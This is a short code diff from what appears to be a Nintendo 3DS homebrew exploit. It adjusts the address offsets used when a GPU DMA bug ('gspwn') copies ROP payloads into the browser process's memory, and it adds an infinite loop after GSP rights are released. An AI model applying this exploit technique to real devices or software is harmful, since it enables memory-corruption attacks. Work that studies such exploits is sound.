@@ -490,7 +490,7 @@ int main(u32 size, char** argv)
 			memcpy((u8*)0x14100000, spider_initial_rop_bin, spider_initial_rop_bin_size);
 			_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)0x14100000, 0x1000);
 
-			doGspwn((u32*)0x14100000, (u32*)(SPIDER_INITIALROP_PADR-0x0C000000), 0x1000);
+			doGspwn((u32*)0x14100000, (u32*)(SPIDER_INITIALROP_PADR+FIRM_LINEAROFFSET), 0x1000);
 		}
 
 		svc_sleepThread(100000000);
@@ -500,7 +500,7 @@ int main(u32 size, char** argv)
 			memcpy((u8*)0x14100000, spider_thread0_rop_bin, spider_thread0_rop_bin_size);
 			_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)0x14100000, 0x2000);
 
-			doGspwn((u32*)0x14100000, (u32*)(SPIDER_THREAD0ROP_PADR-0x0C000000), 0x2000);
+			doGspwn((u32*)0x14100000, (u32*)(SPIDER_THREAD0ROP_PADR+FIRM_LINEAROFFSET), 0x2000);
 		}
 
 		svc_sleepThread(100000000);//sleep long enough for memory to be written
@@ -539,6 +539,7 @@ int main(u32 size, char** argv)
 		drawTitleScreen("running exploit... 040%");
 
 		_GSPGPU_ReleaseRight(*gspHandle); //disable GSP module access
+		while(1);
 	}
 
 	svc_sleepThread(100000000); //sleep just long enough for spider to grab rights
